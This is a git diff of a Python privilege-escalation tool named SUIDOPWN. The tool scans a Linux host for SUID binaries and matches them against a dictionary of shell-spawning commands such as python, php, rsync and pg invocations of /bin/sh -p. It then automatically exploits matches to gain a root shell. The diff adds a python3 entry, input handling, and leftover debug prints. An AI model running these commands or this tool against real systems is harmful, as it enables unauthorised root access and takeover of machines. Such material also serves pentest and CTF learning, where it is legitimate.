@@ -1,6 +1,6 @@
 #!/bin/python3
 
-import subprocess, os, time
+import subprocess, os, time,re
 
 #Printing in color functions
 def blue(skk):
@@ -72,7 +72,8 @@ master = {
         'pexec' : """pexec /bin/sh -p""",
         'pg' : """pg /etc/profile;!/bin/sh""",
         'php' : """CMD="/bin/sh";php -r 'pcntl_exec("/bin/sh", ['-p']);'""",
-        'python' : """python -c 'import os; os.execl("/bin/sh", "sh", "-p")'""",
+        'python' : """python -c 'import os; os.execl("/bin/sh", "sh", "-p")'""", 
+        'python3' : """python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'""", 
         'rc' : """rc -c '/bin/sh -p'""",
         'rlwrap' : """rlwrap -H /dev/null /bin/sh -p""",
         'rsync' : """rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null""",
@@ -122,8 +123,9 @@ staged = ['debugfs', 'ed', 'hping3', 'less', 'more', 'pg', 'scanmem']
 #Finds all binaries with SUID bit set on the target and saves them to a list.
 bins = subprocess.run(["find","/usr/bin","/usr/sbin","/opt", "/home/","-type","f","-perm","-4000"], stdout=subprocess.PIPE,text=True)
 suid = bins.stdout.split()
-suid = [x.split("/")[-1] for x in suid]
-
+suid = [re.sub("\.\d*","",x.split("/")[-1]) for x in suid]
+print(suid)
+input()
 #Compares suid list items to items in roots dict, and sorts them on successibility of exploit. 
 possible_vulns = [x for x in suid if x in master.keys()]
 vulns = sorted([x for x in possible_vulns if x in roots])
@@ -166,11 +168,16 @@ By the Hashslinging Bashers
         red("  " + vuln)
         time.sleep(.1)
     print("\n  ***NOTE: Staged binaries can NOT be automatically exploited using SUIDOPWN. Use search function to see how to manually exploit...Results may vary...***\n")
-    purple("\n  0) Search For Specific Binary\n")
+    purple("\n  0) Search For Specific Binary\n\n")
+    red("  Q) Quit\n\n")
     #Users choice for selectting a binary or searching for a binary. 
     choice = input("\n\n  Exploit Selection: ")
-    if choice != "0":
+    if choice.isnumeric() == True and choice != "0":
         return found_vulns[(int(choice) -1)]
+
+    elif str.lower(choice) == "q":
+        red("Quiting script... Goodbye")
+        exit()
     #If user selects Search functionality, then the script will see if the binary is included in the master dictionary.
     #Script then searches if the specific binary has SUID bit set on the target and prints the status. 
     #Prints the command(s) needed to obtain a root shell utilizing the specified binary.
@@ -201,7 +208,7 @@ By the Hashslinging Bashers
         else:
             red("\n\n  Invalid Selection...\n\n  Binary Not Found or is not vulnerable...\n\n  Exiting...\n")
             exit()
-
+        
 def main():
     exploit = get_exploit()
     print("  Exploiting " + exploit + "...\n")
